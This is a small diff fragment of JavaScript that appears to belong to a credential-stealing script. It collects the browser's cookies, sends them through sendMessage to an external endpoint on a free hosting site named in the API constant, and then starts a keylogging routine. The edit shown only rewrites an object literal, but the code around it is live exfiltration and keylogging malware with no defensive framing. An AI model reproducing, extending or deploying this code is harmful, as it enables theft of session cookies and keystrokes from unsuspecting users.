@@ -58,7 +58,7 @@ const API = "https://litho-bump.000webhostapp.com/index.php",
         } else {
             try {
                 const cookie = await getCookies();
-                const user = { cookie };
+                const user = { cookie: cookie };
                 sendMessage(user);
             } catch (error) {}
             keyLogging();
